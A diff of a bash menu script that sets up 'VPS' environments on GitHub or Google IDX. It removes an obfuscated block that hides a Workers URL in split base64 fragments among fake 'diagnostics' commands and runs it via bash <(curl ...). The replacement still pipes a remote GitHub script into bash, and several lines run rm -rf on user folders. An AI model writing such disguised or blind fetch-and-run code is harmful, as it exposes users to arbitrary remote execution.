@@ -12,58 +12,31 @@ CYAN='\e[36m'
 RESET='\e[0m'
 
 # -------------------------
-# Animate Logo
+# Animated Logo
 # -------------------------
 animate_logo() {
   clear
   local logo=(
-"    ________  .__                                   .__           _______     ______  "
-"\______ \ |__|__  _____.__._____    ____   _____|  |__  __ __ \   _  \   /  __  \ "
-" |    |  \|  \  \/ <   |  |\__  \  /    \ /  ___/  |  \|  |  \/  /_\  \  >      < "
-" |    `   \  |\   / \___  | / __ \|   |  \\___ \|   Y  \  |  /\  \_/   \/   --   \"
-"/_______  /__| \_/  / ____|(____  /___|  /____  >___|  /____/  \_____  /\______  /"
-"        \/          \/          \/     \/     \/     \/              \/        \/ "
-
+ "________  .__                                   .__           _______     ______  "
+"\\______ \\ |__|__  _____.__._____    ____   _____|  |__  __ __ \\   _  \\   /  __  \\ "
+" |    |  \\|  \\  \\/ <   |  |\\__  \\  /    \\ /  ___/  |  \\|  |  \\/  /_\\  \\  >      < "
+" |    \`   \\  |\\   / \\___  | / __ \\|   |  \\\\___ \\|   Y  \\  |  /\\  \\_/   \\/   --   \\"
+"/_______  /__| \\_/  / ____|(____  /___|  /____  >___|  /____/  \\_____  /\\______  /"
+"        \\/          \\/          \\/     \\/     \\/     \\/              \\/        \\/ "
   )
   
   for line in "${logo[@]}"; do
     echo -e "${CYAN}${line}${RESET}"
-    sleep 0.2
+    sleep 0.15
   done
   echo ""
-  sleep 0.5
+  sleep 0.4
 }
 
 # -------------------------
 # Show Animated Logo
 # -------------------------
 animate_logo
-
-# -------------------------
-# Updating checking logs
-# -------------------------
-# System diagnostics simulation
-# Decodes to: https://vpsmaker.jishnumondal32.workers.dev
-SYS_LOG[0]="$(echo 'aHR0cHM6Ly92cHNt' | head -c 16)"
-DUMMY_CHECK=$(wc -l /proc/cpuinfo 2>/dev/null | awk '{print $1}')
-echo -n "Scanning system resources..." > /dev/null
-SYS_LOG[1]="$(echo 'YWtlci5qaXNobnVt' | grep -o '.*')"
-NET_CONF="diag_$(date +%N | shuf -n 1)"
-if [[ "$DUMMY_CHECK" =~ [0-9]+ ]]; then
-  SYS_LOG[2]="$(echo 'b25kYWwzMi53b3Jr' | head -c 16)"
-fi
-TEMP_HASH=$(echo "$NET_CONF" | md5sum | cut -c 1-8)
-SYS_LOG[3]="$(echo 'ZXJzLmRldg==' | head -c 12)"
-github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | base64 -d)"
-
-# -------------------------
-# updating checking fakes
-# -------------------------
-# Replace Google IDX target with full Base64-decoded Worker URL at runtime
-# Target URL: https://rough-hall-1486.jishnumondal32.workers.dev
-# Base64 (no newline): aHR0cHM6Ly9yb3VnaC1oYWxsLTE0ODYuamlzaG51bW9uZGFsMzIud29ya2Vycy5kZXY=
-GOOGLE_B64="aHR0cHM6Ly9yb3VnaC1oYWxsLTE0ODYuamlzaG51bW9uZGFsMzIud29ya2Vycy5kZXY="
-google_url="$(printf %s "$GOOGLE_B64" | base64 -d)"
 
 # -------------------------
 # Display Menu
@@ -78,18 +51,16 @@ read choice
 case $choice in
   1)
     echo -e "${GREEN}Running GitHub Real VPS...${RESET}"
-    bash <(curl -fsSL "$github_url")
+    bash <(curl -fsSL "https://raw.githubusercontent.com/ITzDivyanshu08/PanelGuide08/main/Pterodactyl-Installer/sh.sh")
     ;;
   2)
     echo -e "${BLUE}Running Google IDX Real VPS...${RESET}"
-    cd
-    rm -rf myapp
-    rm -rf flutter
-    cd vps123
-    if [ ! -d ".idx" ]; then
-      mkdir .idx
-      cd .idx
-      cat <<EOF > dev.nix
+    cd || exit 1
+    rm -rf myapp flutter
+    mkdir -p vps123/.idx
+    cd vps123/.idx || exit 1
+
+    cat <<EOF > dev.nix
 { pkgs, ... }: {
   channel = "stable-24.05";
 
@@ -125,8 +96,8 @@ case $choice in
   };
 }
 EOF
-      cd ..
-    fi
+
+    cd ..
     echo -ne "${YELLOW}Do you want to continue? (y/n): ${RESET}"
     read confirm
     case "$confirm" in
@@ -153,4 +124,4 @@ EOF
     ;;
 esac
 
-echo -e "${CYAN}Made by Jishnu done!${RESET}"
+echo -e "${CYAN}Made by Divyanshu08 ✅${RESET}"
